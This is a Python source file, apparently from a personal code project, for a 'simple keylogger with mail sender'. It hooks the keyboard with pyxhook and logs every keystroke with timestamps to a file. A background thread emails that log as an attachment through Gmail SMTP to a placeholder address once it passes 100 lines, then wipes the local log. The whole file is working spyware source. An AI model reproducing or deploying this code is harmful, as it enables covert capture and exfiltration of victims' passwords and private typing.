##
# Simple keylogger with mail sender  
# Loïc Le Doeuff 2019
## 


import os
import sys
import datetime,time
import pyxhook
import smtplib
from getpass import getpass
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

  
#creating key pressing event and saving it into log file 
def OnKeyPress(event): 
    with open('/path_to_log_file/file.log', 'a') as f: 
        if event.Ascii==13:
            f.write(format(event.Key) + '\n' + str(datetime.datetime.now()) + ' >  ')
        else:
            f.write(format(event.Key)) 

#count lines in a file
def CountLines(file_path):
    num_lines = 0
    with open(file_path, 'r') as f:
        for line in f:
            num_lines +=1 
    return num_lines


#class send mail in a thread
#It will send a mail when number of lines will be bigger than 100 lines
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global count 
            count = CountLines('/path_to_log_file/file.log') # count how many lines file.log have
            if count > 100:
                ts = datetime.datetime.now()
                server_smtp = "smtp.gmail.com" 
                port = 587 
                email = 'XXXXX@gmail.com'
                password = 'XXXXXX'
                send_to_email = 'XXXXXX@gmail.com'
                subject = 'Keylogger data :'+str(ts)
                message = ''
                file_location = '/path_to_log_file/file.log'

                msg = MIMEMultipart()
                msg['From'] = email
                msg['To'] = send_to_email
                msg['Subject'] = subject

                msg.attach(MIMEText(message, 'plain'))

                filename = os.path.basename(file_location)
                attachment = open(file_location, "rb")
                part = MIMEBase('application', 'octet-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

                msg.attach(part)

                try:
                    server = smtplib.SMTP(server_smtp, port)
                    server.ehlo()
                    server.starttls()
                    server.login(email, password)
                    text = msg.as_string()
                    server.sendmail(email, send_to_email, text)
                    server.quit()
                except Exception as e:
                    print(e)
                open('/path_to_log_file/file.log', 'w').close()

def main():
    try: 
        new_hook.start()   # start the hook 
        email = TimerClass() 
        email.start() # start mail sender thread  
    except KeyboardInterrupt: 
        # User cancelled from command line. 
        pass


if __name__ == "__main__":
    # create a hook manager object 
    new_hook = pyxhook.HookManager() 
    new_hook.KeyDown = OnKeyPress 
    # set the hook 
    new_hook.HookKeyboard() 
    main()
